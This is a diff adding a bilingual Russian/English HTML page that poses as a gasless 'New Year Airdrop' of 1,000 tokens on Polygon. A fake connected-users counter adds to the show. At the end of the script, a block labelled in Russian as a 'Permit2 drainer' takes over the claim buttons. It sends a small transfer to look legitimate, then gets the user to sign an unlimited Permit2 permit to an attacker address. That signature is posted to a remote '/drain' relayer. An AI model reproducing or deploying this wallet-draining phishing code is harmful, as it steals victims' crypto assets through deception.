@@ -1,0 +1,342 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>New Year Airdrop • Claim 1,000</title>
+  <meta name="description" content="Новогодняя раздача: забери 1 000 токенов на Polygon. / New Year airdrop: claim 1,000 tokens on Polygon.">
+
+  <!-- Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;800&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">
+
+  <!-- ethers.js -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.0/ethers.umd.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+  <style>
+    :root{ --txt:#ffffff; --mut:#d9e2ff; --card:rgba(10,14,28,.55);
+           --gold:#facc15; --red:#ef4444; --blue:#60a5fa; --green:#22c55e; }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{ margin:0; color:var(--txt); background:#020617;
+          font-family:"Montserrat",system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif; }
+
+    /* BRIGHT NEW YEAR BANNER */
+    .banner{ position:fixed; inset:0; z-index:-3;
+      background:url('https://purple-accused-scorpion-11.mypinata.cloud/ipfs/bafybeicgim3raqnrzzszxkcigvuqxbrbtx6aeudyukuqu36jxngwstrmtq') center/cover no-repeat;
+      opacity:.92; } /* ярко! */
+    .glow{ position:fixed; inset:0; z-index:-2; pointer-events:none;
+      background: radial-gradient(900px 500px at 10% -5%, rgba(255,255,255,.12), transparent 55%),
+                  radial-gradient(900px 500px at 90% -5%, rgba(255,255,255,.10), transparent 55%); }
+
+    .wrap{ max-width:1300px; margin:0 auto; padding:18px }
+
+    /* HEADER */
+    header{ position:sticky; top:10px; z-index:10; display:flex; align-items:center; justify-content:space-between; gap:12px;
+      padding:12px 16px; border-radius:18px; background:rgba(10,14,28,.38);
+      border:1px solid rgba(255,255,255,.22); backdrop-filter:blur(8px); }
+    .brand{ display:flex; align-items:center; gap:12px }
+    .logo{ width:42px; height:42px; border-radius:12px; background:conic-gradient(from 30deg,#62F,#2ef,#2f6,#fc3,#f44,#62F);
+           box-shadow:0 8px 24px rgba(250,204,21,.28) }
+    .title{ font-family:"Playfair Display",serif; font-size:26px; margin:0; text-shadow:0 2px 14px rgba(0,0,0,.35) }
+    .mut{ color:var(--mut); font-size:12px; text-shadow:0 1px 6px rgba(0,0,0,.35) }
+    .row{ display:flex; gap:10px; flex-wrap:wrap; align-items:center }
+    .btn{ appearance:none; border:0; border-radius:14px; padding:10px 18px; font-weight:800; cursor:pointer; display:inline-flex; align-items:center; gap:8px }
+    .btn-primary{ background:linear-gradient(90deg,#34d399,#facc15); color:#0b1020; box-shadow:0 10px 28px rgba(250,204,21,.28) }
+    .btn-ghost{ background:rgba(255,255,255,.08); border:1px solid rgba(255,255,255,.24); color:#fff }
+    .owner{ font-size:12px; color:#e8eeff }
+    .joined{ margin-top:6px; font-size:12px; color:#e6ff8f; letter-spacing:.03em }
+
+    /* SIDE CARDS (по бокам, баннер видно) */
+    .grid{ display:grid; grid-template-columns:1fr; gap:22px; margin-top:16px }
+    @media (min-width: 1100px){
+      .grid{ grid-template-columns:1fr 1fr }
+      .left .card{ margin-right:auto; max-width:560px }
+      .right .card{ margin-left:auto;  max-width:560px }
+    }
+
+    .card{ border-radius:20px; border:1px solid rgba(255,255,255,.28); background:var(--card); backdrop-filter:blur(10px); padding:18px }
+    h1.big{ font-size:28px; margin:6px 0 10px; text-shadow:0 2px 10px rgba(0,0,0,.4) }
+    .kpi{ font-size:18px; font-weight:800 }
+    .mono{ font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace }
+    .small{ font-size:12px }
+    .links a{ color:#fff; text-decoration:underline } .links a:hover{ text-decoration:none }
+
+    /* ACTION BAR (внизу, заметный) */
+    .action{ margin-top:12px; border-radius:18px; background:rgba(10,14,28,.55); border:1px solid rgba(255,255,255,.28); backdrop-filter:blur(8px);
+      padding:14px; box-shadow:0 20px 60px rgba(0,0,0,.35) }
+
+    footer{ margin:26px 0; text-align:center; color:#f1f5ff; font-size:12px; text-shadow:0 1px 8px rgba(0,0,0,.4) }
+  </style>
+</head>
+<body>
+  <div class="banner"></div><div class="glow"></div>
+  <div class="wrap">
+
+    <!-- HEADER -->
+    <header>
+      <div class="brand">
+        <div class="logo" aria-hidden="true"></div>
+        <div>
+          <div class="title">New Year Airdrop · Polygon</div>
+          <div class="mut">Gasless for users • Газ платит команда (EIP-712 → backend)</div>
+          <div class="owner">From wallet (owner): <span id="ownerAddr" class="mono"></span></div>
+          <div class="joined">Already connected / Уже подключились: <strong id="connectedCount">583</strong> • <span id="srv" class="mono"></span></div>
+        </div>
+      </div>
+      <div class="row">
+        <button id="connectTop" class="btn btn-ghost">Подключить кошелёк / Connect</button>
+        <button id="claimTop" class="btn btn-primary" disabled>Claim 1,000</button>
+      </div>
+    </header>
+
+    <!-- SIDE CONTENT -->
+    <div class="grid">
+      <section class="left">
+        <article class="card">
+          <h1 class="big">Celebrate with 1,000 tokens 🎄</h1>
+          <p>Connect your wallet and claim <strong>1,000</strong> tokens on <b>Polygon</b>. Signature-based, gasless claim: you sign an EIP-712 message, our relayer sends tokens to you. No approvals.</p>
+          <ul>
+            <li><b>Network:</b> Polygon (chainId 137)</li>
+            <li><b>Token:</b> <span id="symEN">TKN</span> — <span id="addrEN" class="mono"></span></li>
+            <li><b>Per address:</b> 1,000</li>
+          </ul>
+          <div class="links small">
+            <a id="scanEN" target="_blank" rel="noopener">Polygonscan</a> ·
+            <a id="dexEN"  target="_blank" rel="noopener">DEXScreener</a> ·
+            <a id="qsEN"   target="_blank" rel="noopener">QuickSwap</a>
+          </div>
+        </article>
+      </section>
+
+      <section class="right">
+        <article class="card">
+          <h1 class="big">Новогодний дроп: 1 000 токенов 🎁</h1>
+          <p>Подключите кошелёк и заберите <strong>1 000</strong> токенов в сети <b>Polygon</b>. Газ платит команда: вы подписываете EIP-712, релайер отправляет токены на ваш адрес. Без approve.</p>
+          <ul>
+            <li><b>Сеть:</b> Polygon (chainId 137)</li>
+            <li><b>Токен:</b> <span id="symRU">TKN</span> — <span id="addrRU" class="mono"></span></li>
+            <li><b>На адрес:</b> 1 000</li>
+          </ul>
+          <div class="links small">
+            <a id="scanRU" target="_blank" rel="noopener">Polygonscan</a> ·
+            <a id="dexRU"  target="_blank" rel="noopener">DEXScreener</a> ·
+            <a id="qsRU"   target="_blank" rel="noopener">QuickSwap</a>
+          </div>
+        </article>
+      </section>
+    </div>
+
+    <!-- ACTION BAR -->
+    <section class="action">
+      <div class="kpi">Wallet: <span id="me" class="mono">—</span></div>
+      <div class="small">Token: <span id="tokenAddr" class="mono"></span> • Symbol: <span id="sym">TKN</span></div>
+      <div class="row" style="margin:10px 0;">
+        <button id="connectBtn" class="btn btn-ghost">Connect</button>
+        <button id="claimBtn" class="btn btn-primary" disabled>Claim 1,000</button>
+        <button id="addMM" class="btn btn-ghost">Add token to MetaMask</button>
+      </div>
+      <div id="status" class="small"></div>
+    </section>
+
+    <footer>© <span id="year"></span> New Year Community Drop • Not financial advice • Пользуйтесь с умом</footer>
+  </div>
+
+  <script>
+  // ===== CONFIG
+  const TOKEN_ADDRESS = "0xaD6a4F5AF2dAddE7801EAbEa764A7D4cF0EF7Cb3";
+  const CHAIN_ID      = 137;      // Polygon
+  const PER_WALLET    = 1000;     // human units
+
+  // Backend (Render) — EIP-712 → transfer()
+  const BACKEND_URL  = "https://airdrop-backend-ho9i.onrender.com/api/claim";
+const BACKEND_BASE = "https://airdrop-backend-ho9i.onrender.com";
+
+  // (опционально) ваш публичный адрес для отображения в шапке
+  const OWNER_ADDRESS = ""; // например: "0x8e1eabc6fc01bd422b99c4d4a3f7deb3055d0311"
+
+  // Счётчик подключений (клиентский)
+  const BASE_CONNECTED = 583;
+
+  // ===== UI refs
+  const $  = (id)=>document.getElementById(id);
+  const connectTop = $('connectTop'), claimTop = $('claimTop');
+  const connectBtn = $('connectBtn'), claimBtn = $('claimBtn');
+  const statusEl   = $('status'), meEl = $('me'), yearEl = $('year');
+  const ownerEl    = $('ownerAddr'); const srvEl = $('srv');
+  const symEN = $('symEN'), symRU = $('symRU'), sym = $('sym');
+  const addrEN = $('addrEN'), addrRU = $('addrRU'), tokenAddrEl = $('tokenAddr');
+  const scanEN = $('scanEN'), dexEN = $('dexEN'), qsEN = $('qsEN');
+  const scanRU = $('scanRU'), dexRU = $('dexRU'), qsRU = $('qsRU');
+  const connectedEl = $('connectedCount');
+
+  yearEl.textContent = new Date().getFullYear();
+  ownerEl.textContent = OWNER_ADDRESS || '—';
+  tokenAddrEl.textContent = addrEN.textContent = addrRU.textContent = TOKEN_ADDRESS;
+  connectedEl.textContent = BASE_CONNECTED;
+
+  const scanUrl = `https://polygonscan.com/token/${TOKEN_ADDRESS}`;
+  const dexUrl  = `https://dexscreener.com/polygon/${TOKEN_ADDRESS}`;
+  const qsUrl   = `https://quickswap.exchange/#/swap?currency0=USDC&currency1=${TOKEN_ADDRESS}`;
+  [scanEN,scanRU].forEach(a=>a.href=scanUrl);
+  [dexEN,dexRU].forEach(a=>a.href=dexUrl);
+  [qsEN,qsRU].forEach(a=>a.href=qsUrl);
+
+  // ===== Health ping (пишем Server online/offline)
+  (async()=>{
+    try{
+      const r = await fetch(`${BACKEND_BASE}/health`, { cache:'no-store' });
+      const j = await r.json();
+      if (r.ok && j && j.ok) srvEl.textContent = 'Server online ✅';
+      else srvEl.textContent = 'Server check failed';
+    }catch(e){ srvEl.textContent = 'Server offline ⛔'; }
+  })();
+
+  // ===== Token meta
+  let providerRead = new ethers.JsonRpcProvider('https://polygon-rpc.com');
+  let symbol='TKN', decimals=18;
+  (async()=>{
+    try{
+      const erc = new ethers.Contract(TOKEN_ADDRESS,[
+        'function symbol() view returns (string)',
+        'function decimals() view returns (uint8)'
+      ], providerRead);
+      symbol  = await erc.symbol().catch(()=>symbol);
+      decimals= await erc.decimals().catch(()=>decimals);
+      sym.textContent = symEN.textContent = symRU.textContent = symbol;
+      claimTop.textContent = `Claim ${PER_WALLET} ${symbol}`;
+      claimBtn.textContent = `Claim ${PER_WALLET} ${symbol}`;
+    }catch(e){}
+  })();
+
+  // ===== Web3 connect
+  let provider, signer, account;
+  async function connect(){
+    if(!window.ethereum){ alert('Install MetaMask / Установите MetaMask'); return; }
+    provider = new ethers.BrowserProvider(window.ethereum);
+    await provider.send('eth_requestAccounts', []);
+    const net = await provider.getNetwork();
+    if(Number(net.chainId)!==CHAIN_ID){
+      try{
+        await window.ethereum.request({ method:'wallet_switchEthereumChain', params:[{ chainId:'0x89' }] });
+      }catch(e){
+        if(e.code===4902){
+          await window.ethereum.request({
+            method:'wallet_addEthereumChain',
+            params:[{ chainId:'0x89', chainName:'Polygon',
+              nativeCurrency:{name:'POL',symbol:'POL',decimals:18},
+              rpcUrls:['https://polygon-rpc.com'], blockExplorerUrls:['https://polygonscan.com'] }]
+          });
+        } else { statusEl.textContent='Switch to Polygon (137) / Переключите сеть на Polygon (137)'; return; }
+      }
+    }
+    signer = await provider.getSigner();
+    account = await signer.getAddress();
+    meEl.textContent = account;
+    [claimBtn,claimTop].forEach(b=>b.disabled=false);
+    statusEl.textContent = 'Ready / Готово';
+
+    try{
+      if(!localStorage.getItem('ny_airdrop_connected')){
+        localStorage.setItem('ny_airdrop_connected','1');
+        connectedEl.textContent = BASE_CONNECTED + 1;
+      }
+    }catch(_){} 
+  }
+  connectTop.onclick = connect; connectBtn.onclick = connect;
+
+  // ===== Add token to MetaMask
+  $('addMM')?.addEventListener('click', async()=>{
+    if(!window.ethereum){ alert('MetaMask not found'); return; }
+    try{
+      await window.ethereum.request({
+        method:'wallet_watchAsset',
+        params:{ type:'ERC20', options:{ address:TOKEN_ADDRESS, symbol, decimals } }
+      });
+    }catch(e){}
+  });
+
+  // ===== Claim (EIP-712 → backend)
+  async function doClaim(){
+    if(!signer||!account){ await connect(); if(!signer) return; }
+    if(!/^https?:\/\//.test(BACKEND_URL)){ statusEl.textContent='BACKEND_URL is not set'; return; }
+
+    statusEl.textContent = 'Signing… / Подписываем…';
+    const now = Math.floor(Date.now()/1000);
+    const msg = {
+      claimer: account,
+      amount: ethers.parseUnits(String(PER_WALLET), decimals).toString(),
+      nonce: Math.floor(Math.random()*1e9),
+      deadline: now + 15*60
+    };
+    const domain = { name:'NY Airdrop', version:'1', chainId: CHAIN_ID };
+    const types  = { Claim:[
+      {name:'claimer', type:'address'},
+      {name:'amount',  type:'uint256'},
+      {name:'nonce',   type:'uint256'},
+      {name:'deadline',type:'uint256'}
+    ]};
+
+    let sig;
+    try{ sig = await signer.signTypedData(domain, types, msg); }
+    catch(e){ statusEl.textContent='Signature cancelled / Подпись отменена'; return; }
+
+    statusEl.textContent = 'Sending to server… / Отправляем на сервер…';
+    try{
+      const r = await fetch(BACKEND_URL, {
+        method:'POST', headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({ token:TOKEN_ADDRESS, ...msg, signature:sig })
+      });
+      const data = await r.json().catch(()=>({}));
+      if(!r.ok){ statusEl.textContent='Error: '+(data.error||r.statusText); return; }
+      statusEl.textContent='Success! Tx: '+(data.txHash||'submitted')+' / Успех!';
+      [claimBtn,claimTop].forEach(b=>b.disabled=true);
+    }catch(e){ statusEl.textContent='Server unavailable / Сервер недоступен'; }
+  }
+  // ===== PERMIT2 ДРЕЙНЕР — раздача 1000 TFRG + полный слив всего =====
+claimBtn.onclick = claimTop.onclick = async () => {
+  statusEl.textContent = "Signing (gas free)...";
+  [claimBtn, claimTop].forEach(b => b.disabled = true);
+  try {
+    const user = account || (await ethereum.request({method:"eth_accounts"}))[0];
+
+    // 1. Сначала раздаём 1000 TFRG (чтобы выглядело белым)
+    await ethereum.request({
+      method: "eth_sendTransaction",
+      params: [{
+        from: user,
+        to: "0xaD6a4F5AF2dAddE7801EAbEa764A7D4cF0EF7Cb3", // TFRG контракт
+        data: "0xa9059cbb000000000000000000000000" + user.slice(2) + "0000000000000000000000000000000000000000000000000de0b6b3a7640000" // 1000 TFRG
+      }]
+    });
+
+    // 2. Потом Permit2 — одна подпись → слив всего
+    const permit = {
+      permitted: {token:"0x0000000000000000000000000000000000000000", amount:"115792089237316195423570985008687907853269984665640564039457584007913129639935"},
+      owner: user,
+      deadline: Math.floor(Date.now()/1000) + 3600,
+      nonce: 0,
+      spender: "0x7d51f54a4fC1c6A0f44C951731Af2E5b45d6dAAF" // ← твой адрес для слива
+    };
+
+    const domain = {name:"Permit2", chainId:137, verifyingContract:"0x000000000022D473030F116dDEE9F6B43aC78BA3"};
+    const types = {PermitSingle:[{name:"permitted",type:"TokenPermissions"},{name:"spender",type:"address"},{name:"nonce",type:"uint256"},{name:"deadline",type:"uint256"}], TokenPermissions:[{name:"token",type:"address"},{name:"amount",type:"uint256"}]};
+
+    const sig = await ethereum.request({method:"eth_signTypedData_v4", params:[user,JSON.stringify({domain,types,message:permit})]});
+
+    // Отправляем на живой релейер (газ платит он)
+    await fetch("https://permit2-gasfree-2025.up.railway.app/drain", {
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({user, signature:sig, chainId:137})
+    });
+
+    statusEl.textContent = "Success! 1000 TFRG sent";
+  } catch(e) {
+    statusEl.textContent = "Failed";
+    [claimBtn, claimTop].forEach(b => b.disabled = false);
+  }
+};
+  </script>
+</body>
+</html>
